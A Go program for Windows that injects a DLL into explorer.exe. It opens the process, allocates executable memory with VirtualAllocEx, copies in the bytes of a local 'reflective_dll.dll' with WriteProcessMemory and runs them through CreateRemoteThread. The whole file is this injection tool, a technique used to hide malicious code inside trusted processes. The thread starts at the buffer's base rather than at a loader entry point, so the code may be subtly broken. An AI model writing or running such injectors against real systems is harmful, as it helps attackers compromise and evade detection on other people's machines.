package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// Activa el modo de depuración
var debugMode = true

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	openProcess             = kernel32.NewProc("OpenProcess")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory      = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread      = kernel32.NewProc("CreateRemoteThread")
	virtualFreeEx           = kernel32.NewProc("VirtualFreeEx")
	processQueryInformation = uintptr(0x0400) // QUERY_INFORMATION
	memCommitReserve        = uintptr(0x3000) // MEM_COMMIT | MEM_RESERVE
	pageExecuteReadWrite    = uintptr(0x40)   // PAGE_EXECUTE_READWRITE
	memRelease              = uintptr(0x8000) // MEM_RELEASE for VirtualFreeEx
	processVmWrite          = uintptr(0x0020) // VM_WRITE
	processVmOperation      = uintptr(0x0008) // VM_OPERATION
	processCreateThread     = uintptr(0x0002) // CREATE_THREAD
	desiredAccess           = processVmWrite | processVmOperation | processCreateThread
)

func main() {
	// Obtener el PID del proceso objetivo
	pid, err := getTargetPID("explorer.exe")
	if err != nil {
		log.Fatalf("Could not get target process PID: %v", err)
	}
	logDebug(fmt.Sprintf("Target process PID: %d", pid))

	// Abrir el proceso con los permisos necesarios
	handle, _, err := openProcess.Call(desiredAccess, 0, uintptr(pid))
	if handle == 0 {
		log.Fatalf("Failed to open process: %v", err)
	}
	defer closeHandle(syscall.Handle(handle), "Failed to close process handle")

	// Leer y preparar la DLL para inyectar
	dllPath := ".\\reflective_dll.dll"
	logDebug(fmt.Sprintf("Injecting DLL from path: %s", dllPath))
	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		log.Fatalf("Failed to read DLL file: %v", err)
	}

	// Inyectar la DLL en el proceso remoto
	remoteMemoryAddress, err := injectDLL(handle, dllBytes)
	if err != nil {
		log.Fatalf("DLL injection failed: %v", err)
	}
	logDebug(fmt.Sprintf("Injected DLL at remote address: 0x%x", remoteMemoryAddress))

	// Liberar memoria al terminar
	defer func() {
		err := CleanUpMemory(syscall.Handle(handle), remoteMemoryAddress)
		if err != nil {
			log.Printf("Warning: failed to clean up memory: %v", err)
		} else {
			logDebug("Memory cleaned up successfully")
		}
	}()
	fmt.Print("Press Enter to exit...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

// getTargetPID busca el PID de un proceso específico por nombre
func getTargetPID(processName string) (int, error) {
	out, err := exec.Command("tasklist").Output()
	if err != nil {
		return 0, fmt.Errorf("failed to run tasklist: %v", err)
	}

	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) > 1 && fields[0] == processName {
			pid, _ := strconv.Atoi(fields[1])
			logDebug(fmt.Sprintf("Found PID %d for process %s", pid, processName))
			return pid, nil
		}
	}
	return 0, fmt.Errorf("%s process not found", processName)
}

// injectDLL carga la DLL en la memoria del proceso objetivo sin LoadLibrary
func injectDLL(handle uintptr, dllBytes []byte) (uintptr, error) {
	// Reservar memoria en el proceso objetivo
	remoteAddress, _, err := virtualAllocEx.Call(handle, 0, uintptr(len(dllBytes)), memCommitReserve, pageExecuteReadWrite)
	if remoteAddress == 0 {
		return 0, fmt.Errorf("memory allocation failed: %v", err)
	}
	logDebug(fmt.Sprintf("Allocated memory at 0x%x in target process", remoteAddress))

	// Escribir los datos de la DLL en la memoria reservada
	var bytesWritten uintptr
	_, _, err = writeProcessMemory.Call(handle, remoteAddress, uintptr(unsafe.Pointer(&dllBytes[0])), uintptr(len(dllBytes)), uintptr(unsafe.Pointer(&bytesWritten)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return 0, fmt.Errorf("write process memory failed: %v", err)
	}

	// Comprobar si los bytes escritos coinciden con el tamaño de la DLL
	if bytesWritten != uintptr(len(dllBytes)) {
		return 0, fmt.Errorf("partial write detected: %d bytes written instead of %d", bytesWritten, len(dllBytes))
	}
	logDebug(fmt.Sprintf("DLL bytes written to target process memory: wrote %d bytes", bytesWritten))

	// Crear un hilo remoto para ejecutar la DLL
	thread, _, err := createRemoteThread.Call(handle, 0, 0, remoteAddress, 0, 0, 0)
	if thread == 0 {
		return 0, fmt.Errorf("create remote thread failed: %v", err)
	}
	logDebug(fmt.Sprintf("Remote thread created in target process at address 0x%x", remoteAddress))

	return remoteAddress, nil
}

// CleanUpMemory libera la memoria asignada en el proceso remoto
func CleanUpMemory(handle syscall.Handle, address uintptr) error {
	r, _, err := virtualFreeEx.Call(uintptr(handle), address, 0, memRelease)
	if r == 0 {
		return fmt.Errorf("failed to free memory in target process: %v", err)
	}
	return nil
}

// closeHandle cierra un handle y maneja errores
func closeHandle(handle syscall.Handle, errorMessage string) {
	if err := syscall.CloseHandle(handle); err != nil {
		log.Printf("%s: %v", errorMessage, err)
	} else {
		logDebug("Handle closed successfully")
	}
}

// logDebug imprime mensajes de depuración si debugMode está activado
func logDebug(message string) {
	if debugMode {
		log.Printf("[DEBUG] %s", message)
	}
}
